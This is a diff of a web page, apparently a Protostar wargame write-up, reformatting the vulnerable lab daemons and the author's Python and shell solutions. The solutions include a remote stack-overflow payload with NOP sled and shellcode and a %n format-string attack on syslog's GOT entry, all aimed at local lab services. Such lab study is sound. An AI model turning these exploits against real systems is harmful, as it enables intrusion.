+    if(result == wanted) {
+        printf("you added them correctly\n");
+    } else {
+        printf("sorry, try again. invalid\n");
+    }
+}
 
-                    int main(int argc, char **argv, char **envp){
-                      int fd;
-                      char *username;
+int main(int argc, char **argv, char **envp){
+    int fd;
+    char *username;
 
-                      /* Run the process as a daemon */
-                      background_process(NAME, UID, GID); 
-                      
-                      /* Wait for socket activity and return */
-                      fd = serve_forever(PORT);
+    /* Run the process as a daemon */
+    background_process(NAME, UID, GID); 
+    
+    /* Wait for socket activity and return */
+    fd = serve_forever(PORT);
 
-                      /* Set the client socket to STDIN, STDOUT, and STDERR */
-                      set_io(fd);
+    /* Set the client socket to STDIN, STDOUT, and STDERR */
+    set_io(fd);
 
-                      /* Don't do this :> */
-                      srandom(time(NULL));
+    /* Don't do this :> */
+    srandom(time(NULL));
 
-                      run();
-                    }
-                </pre>
+    run();
+}</code></pre>
 
                 <ol>
                     <li>
@@ -1458,25 +1344,23 @@ title: Protostar
                     </li>
                     <li>
                         Again we create a python script that connects to the deamon, reads the data, manipulates it and sends it back.
-                        <pre class="brush: python">
-                            import socket
-                            import re
-                            import struct
+                        <pre><code class="python">import socket
+import re
+import struct
 
-                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s.connect(("127.0.0.1", 2997))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 2997))
 
-                            tot = 0
-                            for x in xrange(4):
-                              data = s.recv(4)
-                              tot += int(struct.unpack("I", data)[0])
+tot = 0
+for x in xrange(4):
+    data = s.recv(4)
+    tot += int(struct.unpack("I", data)[0])
 
-                            tot = tot & 0xffffffff
+tot = tot & 0xffffffff
 
-                            s.send(struct.pack("I", tot))
-                            print s.recv(1024)
-                            s.close()
-                        </pre>
+s.send(struct.pack("I", tot))
+print s.recv(1024)
+s.close()</code></pre>
                         The script reads 4 times 4 bytes, corresponding to the length of usnigned int. We add the numbers to each other, and before sending the sum back we perform the '& 0xFFFFFFFF' to make clear of the possible overflows.
                     </li>
                 </ol>
@@ -1487,124 +1371,122 @@ title: Protostar
             <section>
                 <h3>Net 3</h3>
                 <h4>Implement a simple network protocol</h4>
-                <pre class="brush: c">
-                    #define NAME "net3"
-                    #define UID 996
-                    #define GID 996
-                    #define PORT 2996
+                <pre><code class="cpp">#define NAME "net3"
+#define UID 996
+#define GID 996
+#define PORT 2996
 
-                    /*
-                     * Extract a null terminated string from the buffer 
-                     */
+/*
+    * Extract a null terminated string from the buffer 
+    */
 
-                    int get_string(char **result, unsigned char *buffer, u_int16_t len){
-                      unsigned char byte;
+int get_string(char **result, unsigned char *buffer, u_int16_t len){
+    unsigned char byte;
 
-                      byte = *buffer;
+    byte = *buffer;
 
-                      if(byte > len) errx(1, "badly formed packet");
-                      *result = malloc(byte);
-                      strcpy(*result, buffer + 1);
+    if(byte > len) errx(1, "badly formed packet");
+    *result = malloc(byte);
+    strcpy(*result, buffer + 1);
 
-                      return byte + 1;
-                    }
+    return byte + 1;
+}
 
-                    /*
-                     * Check to see if we can log into the host
-                     */
+/*
+    * Check to see if we can log into the host
+    */
 
-                    int login(unsigned char *buffer, u_int16_t len){
-                      char *resource, *username, *password;
-                      int deduct;
-                      int success;
+int login(unsigned char *buffer, u_int16_t len){
+    char *resource, *username, *password;
+    int deduct;
+    int success;
 
-                      if(len < 3) errx(1, "invalid login packet length");
+    if(len &lt; 3) errx(1, "invalid login packet length");
 
-                      resource = username = password = NULL;
+    resource = username = password = NULL;
 
-                      deduct = get_string(&resource, buffer, len);
-                      deduct += get_string(&username, buffer+deduct, len-deduct);
-                      deduct += get_string(&password, buffer+deduct, len-deduct);
+    deduct = get_string(&resource, buffer, len);
+    deduct += get_string(&username, buffer+deduct, len-deduct);
+    deduct += get_string(&password, buffer+deduct, len-deduct);
 
-                      success = 0;
-                      success |= strcmp(resource, "net3");
-                      success |= strcmp(username, "awesomesauce");
-                      success |= strcmp(password, "password");
+    success = 0;
+    success |= strcmp(resource, "net3");
+    success |= strcmp(username, "awesomesauce");
+    success |= strcmp(password, "password");
 
-                      free(resource);
-                      free(username);
-                      free(password);
+    free(resource);
+    free(username);
+    free(password);
 
-                      return ! success;
-                    }
+    return ! success;
+}
 
-                    void send_string(int fd, unsigned char byte, char *string){
-                      struct iovec v[3];
-                      u_int16_t len;
-                      int expected;
+void send_string(int fd, unsigned char byte, char *string){
+    struct iovec v[3];
+    u_int16_t len;
+    int expected;
 
-                      len = ntohs(1 + strlen(string));
+    len = ntohs(1 + strlen(string));
 
-                      v[0].iov_base = &len;
-                      v[0].iov_len = sizeof(len);
-                      
-                      v[1].iov_base = &byte;
-                     v [1].iov_len = 1;
+    v[0].iov_base = &amp;len;
+    v[0].iov_len = sizeof(len);
+    
+    v[1].iov_base = &amp;byte;
+    v [1].iov_len = 1;
 
-                      v[2].iov_base = string;
-                      v[2].iov_len = strlen(string);
+    v[2].iov_base = string;
+    v[2].iov_len = strlen(string);
 
-                      expected = sizeof(len) + 1 + strlen(string);
+    expected = sizeof(len) + 1 + strlen(string);
 
-                      if(writev(fd, v, 3) != expected) errx(1, "failed to write correct amount of bytes");
-                    }
+    if(writev(fd, v, 3) != expected) errx(1, "failed to write correct amount of bytes");
+}
 
-                    void run(int fd){
-                      u_int16_t len;
-                      unsigned char *buffer;
-                      int loggedin;
+void run(int fd){
+    u_int16_t len;
+    unsigned char *buffer;
+    int loggedin;
 
-                      while(1) {
-                          nread(fd, &len, sizeof(len));
-                          len = ntohs(len);
-                          buffer = malloc(len);
+    while(1) {
+        nread(fd, &len, sizeof(len));
+        len = ntohs(len);
+        buffer = malloc(len);
 
-                          if(! buffer) errx(1, "malloc failure for %d bytes", len);
+        if(! buffer) errx(1, "malloc failure for %d bytes", len);
 
-                          nread(fd, buffer, len);
+        nread(fd, buffer, len);
 
-                          switch(buffer[0]) {
-                              case 23:
-                                  loggedin = login(buffer + 1, len - 1);
-                                  send_string(fd, 33, loggedin ? "successful" : "failed");
-                                  break;
-                              
-                              default:
-                                  send_string(fd, 58, "what you talkin about willis?");
-                                  break;
-                          }
-                      }
-                    }
+        switch(buffer[0]) {
+            case 23:
+                loggedin = login(buffer + 1, len - 1);
+                send_string(fd, 33, loggedin ? "successful" : "failed");
+                break;
+            
+            default:
+                send_string(fd, 58, "what you talkin about willis?");
+                break;
+        }
+    }
+}
 
-                    int main(int argc, char **argv, char **envp){
-                      int fd;
-                      char *username;
+int main(int argc, char **argv, char **envp){
+    int fd;
+    char *username;
 
-                      /* Run the process as a daemon */
-                      background_process(NAME, UID, GID); 
-                      
-                      /* Wait for socket activity and return */
-                      fd = serve_forever(PORT);
+    /* Run the process as a daemon */
+    background_process(NAME, UID, GID); 
+    
+    /* Wait for socket activity and return */
+    fd = serve_forever(PORT);
 
-                      /* Set the client socket to STDIN, STDOUT, and STDERR */
-                      set_io(fd);
+    /* Set the client socket to STDIN, STDOUT, and STDERR */
+    set_io(fd);
 
-                      /* Don't do this :> */
-                      srandom(time(NULL));
+    /* Don't do this :> */
+    srandom(time(NULL));
 
-                      run(fd);
-                    }
-                </pre>
+    run(fd);
+}</code></pre>
 
                 <ol>
                     <li>
@@ -1613,26 +1495,24 @@ title: Protostar
                     </li>
                     <li>
                         Again we create a python script that connects to the deamon, reads the data, manipulates it and sends it back.
-                        <pre class="brush: python">
-                            import socket
-                            import re
-                            import struct
+                        <pre><code class="python">import socket
+import re
+import struct
 
-                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s.connect(("127.0.0.1", 2996))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 2996))
 
-                            login_string = "\x17"
-                            login_string += "\x05net3\x00"
-                            login_string += "\x0dawesomesauce\x00"
-                            login_string += "\x0apassword\x00"
+login_string = "\x17"
+login_string += "\x05net3\x00"
+login_string += "\x0dawesomesauce\x00"
+login_string += "\x0apassword\x00"
 
-                            login_length = len(login_string)
+login_length = len(login_string)
 
-                            s.send(struct.pack(">H", login_length))
-                            s.send(login_string)
-                            print s.recv(1024)
-                            s.close()
-                        </pre>
+s.send(struct.pack(">H", login_length))
+s.send(login_string)
+print s.recv(1024)
+s.close()</code></pre>
                         The script creates the login string: first of all the "secret" byte to access the login functionality, then the name of the service, then the username and at the end the password. The length of this string is sent as unsigned short (as defined in the C code), then the string itself is sent out. The terminating NULL is required by the <i>strcpy</i> method.
                     </li>
                 </ol>
@@ -1643,57 +1523,55 @@ title: Protostar
             <section>
                 <h3>Final 0</h3>
                 <h4>Combine a stack overflow and network programming for a remote overflow.</h4>
-                <pre class="brush: c">
-                    #define NAME "final0"
-                    #define UID 0
-                    #define GID 0
-                    #define PORT 2995
+                <pre><code class="cpp">#define NAME "final0"
+#define UID 0
+#define GID 0
+#define PORT 2995
 
-                    /*
-                     * Read the username in from the network
-                     */
+/*
+    * Read the username in from the network
+    */
 
-                    char *get_username(){
-                      char buffer[512];
-                      char *q;
-                      int i;
+char *get_username(){
+    char buffer[512];
+    char *q;
+    int i;
 
-                      memset(buffer, 0, sizeof(buffer));
-                      gets(buffer);
+    memset(buffer, 0, sizeof(buffer));
+    gets(buffer);
 
-                      /* Strip off trailing new line characters */
-                      q = strchr(buffer, '\n');
-                      if(q) *q = 0;
-                      q = strchr(buffer, '\r');
-                      if(q) *q = 0;
+    /* Strip off trailing new line characters */
+    q = strchr(buffer, '\n');
+    if(q) *q = 0;
+    q = strchr(buffer, '\r');
+    if(q) *q = 0;
 
-                      /* Convert to lower case */
-                      for(i = 0; i < strlen(buffer); i++) {
-                          buffer[i] = toupper(buffer[i]);
-                      }
+    /* Convert to lower case */
+    for(i = 0; i &lt; strlen(buffer); i++) {
+        buffer[i] = toupper(buffer[i]);
+    }
 
-                      /* Duplicate the string and return it */
-                      return strdup(buffer);
-                    }
+    /* Duplicate the string and return it */
+    return strdup(buffer);
+}
 
-                    int main(int argc, char **argv, char **envp){
-                      int fd;
-                      char *username;
+int main(int argc, char **argv, char **envp){
+    int fd;
+    char *username;
 
-                      /* Run the process as a daemon */
-                      background_process(NAME, UID, GID); 
-                      
-                      /* Wait for socket activity and return */
-                      fd = serve_forever(PORT);
+    /* Run the process as a daemon */
+    background_process(NAME, UID, GID); 
+    
+    /* Wait for socket activity and return */
+    fd = serve_forever(PORT);
 
-                      /* Set the client socket to STDIN, STDOUT, and STDERR */
-                      set_io(fd);
+    /* Set the client socket to STDIN, STDOUT, and STDERR */
+    set_io(fd);
 
-                      username = get_username();
-                      
-                      printf("No such user %s\n", username);
-                    }
-                </pre>
+    username = get_username();
+    
+    printf("No such user %s\n", username);
+}</code></pre>
 
                 <blockquote><b>nopsled:</b> a NOP sled is a sequence of NOP (no-operation) instructions that are usually inserted as a landing zone for a jump that doesn't have a precise target address. A nopsled gives a larger landing space, easier to guess than a single address, and will make the execution flow down to the actual starting point without secondary effects.</blockquote>
 
@@ -1703,17 +1581,15 @@ title: Protostar
                     </li>
                     <li>
                         The first thing to do is to check how many characters we need to pass to overwrite the $eip after the buffer. We can't do it automatically with the service we used until now because the <i>toUpper</i> function will mix up the results, so we will do it manually:
-                        <pre class="brush: python">
-                            import socket
-                            import struct
+                        <pre><code class="python">import socket
+import struct
 
-                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s.connect(("127.0.0.1", 2995))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 2995))
 
-                            offset = 'a' * 512 + 'b' * 4 + c * 4 + 'd' * 4
-                            
-                            s.send(offset)
-                        </pre>
+offset = 'a' * 512 + 'b' * 4 + c * 4 + 'd' * 4
+
+s.send(offset)</code></pre>
                     </li>
                     <li>
                         After executing the python script we switch to a root account with <code>su root</code> and password <code>godmode</code> to check if we managed to cause a segmentation fault. If yes, the core dump file is saved in <i>/tmp</i> and we can look at it with <code>gdb --core /tmp/core_xxx</code>. In this case we will see with what $eip crashed, and can adjust the length of our offset payload. If no segfault happened, we have to try again with a longer payload.<br>
@@ -1724,29 +1600,27 @@ title: Protostar
                     </li>
                     <li>
                         We can now start to build the payload, knowing that we will need a return address that points at the start of the buffer but remembering that we don't know the exact starting address of the buffer itself. To solve this problem, we start the payload with a nopsled, so that we can aim at the buffer without having to worry about guessing the precise address. After the sled we place the shellcode, than we pad with whatever until we reach the $eip, and there we put a mock address.
-                        <pre class="brush: python">
-                            import socket
-                            import struct
+                        <pre><code class="python">import socket
+import struct
 
-                            s = socket.socket(AF_INET, SOCK_STREAM)
-                            s.connect(("127.0.0.1", 2995))
+s = socket.socket(AF_INET, SOCK_STREAM)
+s.connect(("127.0.0.1", 2995))
 
-                            nop = "\x90"*24
+nop = "\x90"*24
 
-                            shellcode = "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff" \
-                            "\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47" \
-                            "\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed" \
-                            "DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB" \
-                            "AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA" \
-                            "JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO" \
-                            "BLAALMNIA"
+shellcode = "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff" \
+"\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47" \
+"\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed" \
+"DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB" \
+"AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA" \
+"JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO" \
+"BLAALMNIA"
 
-                            padding = "a"*(532-len(nop)-len(shellcode))
+padding = "a"*(532-len(nop)-len(shellcode))
 
-                            ret = "\xaa\xaa\xaa\xaa"
+ret = "\xaa\xaa\xaa\xaa"
 
-                            s.send(nop + shellcode + padding + ret)
-                        </pre>
+s.send(nop + shellcode + padding + ret)</code></pre>
                     </li>
                     <li>
                         Running this script causes another segmentation fault, because our return address is obviously non-existing. So what we have to do is to find out a return address that makes sense. We start gdb again with the core dump, and we look at the registers, with <code>i r</code>. What we are interested in is the $esp register, that tells us where the stack ends. Now it's a matter of patience while looking at the stack content until we find our nopsled: we go through the memory with <code>gdb > x/100x $esp-x</code>, where we increase x until we find the bunc of '90' that correspond to the nop instructions.
@@ -1765,82 +1639,80 @@ title: Protostar
             <section>
                 <h3>Final 1</h3>
                 <h4>Remote blind format string</h4>
-                <pre class="brush: c">
-                    #define NAME "final1"
-                    #define UID 0
-                    #define GID 0
-                    #define PORT 2994
+                <pre><code class="cpp">#define NAME "final1"
+#define UID 0
+#define GID 0
+#define PORT 2994
 
-                    char username[128];
-                    char hostname[64];
+char username[128];
+char hostname[64];
 
-                    void logit(char *pw){
-                      char buf[512];
+void logit(char *pw){
+    char buf[512];
 
-                      snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);
+    snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);
 
-                      syslog(LOG_USER|LOG_DEBUG, buf);
-                    }
+    syslog(LOG_USER|LOG_DEBUG, buf);
+}
 
-                    void trim(char *str){
-                      char *q;
+void trim(char *str){
+    char *q;
 
-                      q = strchr(str, '\r');
-                      if(q) *q = 0;
-                      q = strchr(str, '\n');
-                      if(q) *q = 0;
-                    }
+    q = strchr(str, '\r');
+    if(q) *q = 0;
+    q = strchr(str, '\n');
+    if(q) *q = 0;
+}
 
-                    void parser(){
-                      char line[128];
+void parser(){
+    char line[128];
 
-                      printf("[final1] $ ");
+    printf("[final1] $ ");
 
-                      while(fgets(line, sizeof(line)-1, stdin)) {
-                          trim(line);
-                          if(strncmp(line, "username ", 9) == 0) {
-                              strcpy(username, line+9);
-                          } else if(strncmp(line, "login ", 6) == 0) {
-                              if(username[0] == 0) {
-                                  printf("invalid protocol\n");
-                              } else {
-                                  logit(line + 6);
-                                  printf("login failed\n");
-                              }
-                          }
-                          printf("[final1] $ ");
-                      }
-                    }
+    while(fgets(line, sizeof(line)-1, stdin)) {
+        trim(line);
+        if(strncmp(line, "username ", 9) == 0) {
+            strcpy(username, line+9);
+        } else if(strncmp(line, "login ", 6) == 0) {
+            if(username[0] == 0) {
+                printf("invalid protocol\n");
+            } else {
+                logit(line + 6);
+                printf("login failed\n");
+            }
+        }
+        printf("[final1] $ ");
+    }
+}
 
-                    void getipport(){
-                      int l;
-                      struct sockaddr_in sin;
+void getipport(){
+    int l;
+    struct sockaddr_in sin;
 
-                      l = sizeof(struct sockaddr_in);
-                      if(getpeername(0, &sin, &l) == -1) {
-                          err(1, "you don't exist");
-                      }
+    l = sizeof(struct sockaddr_in);
+    if(getpeername(0, &sin, &l) == -1) {
+        err(1, "you don't exist");
+    }
 
-                      sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
-                    }
+    sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
+}
 
-                    int main(int argc, char **argv, char **envp){
-                      int fd;
-                      char *username;
+int main(int argc, char **argv, char **envp){
+    int fd;
+    char *username;
 
-                      /* Run the process as a daemon */
-                      background_process(NAME, UID, GID); 
-                      
-                      /* Wait for socket activity and return */
-                      fd = serve_forever(PORT);
+    /* Run the process as a daemon */
+    background_process(NAME, UID, GID); 
+    
+    /* Wait for socket activity and return */
+    fd = serve_forever(PORT);
 
-                      /* Set the client socket to STDIN, STDOUT, and STDERR */
-                      set_io(fd);
+    /* Set the client socket to STDIN, STDOUT, and STDERR */
+    set_io(fd);
 
-                      getipport();
-                      parser();
-                    }
-                </pre>
+    getipport();
+    parser();
+}</code></pre>
 
                 <blockquote><b>void syslog(int priority, const char *format, ...):</b> generates a log message, where the priority argument is formed by the level values and the remaining arguments are a format.</blockquote>
 
@@ -1856,26 +1728,13 @@ title: Protostar
             <section>
                 <h3>Final 2</h3>
                 <h4>Remote heap</h4>
-                <pre class="brush: c">
-                    
-                </pre>
-
-                <ol>
-                    <li>
-                        [final1] $ username aabbaa%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+                <pre><code class="bash">[final1] $ username aabbaa%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
 [final1] $ login adsf
-
-
-
 
 objdump -R /opt/protostar/bin/final1 | grep syslog
 0804a11c R_386_JUMP_SLOT   syslog
 \x1c\xa1\x04\x08
 
 python -c "print 'username a' + '\x1c\xa1\x04\x08' + 'c' + '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n' + '\nlogin asdf'" > /tmp/f1
-nc 127.0.0.1 2994 < /tmp/f1 
-
-
-                    </li>
-                </ol>
+nc 127.0.0.1 2994 &lt; /tmp/f1</code></pre>
             </section>
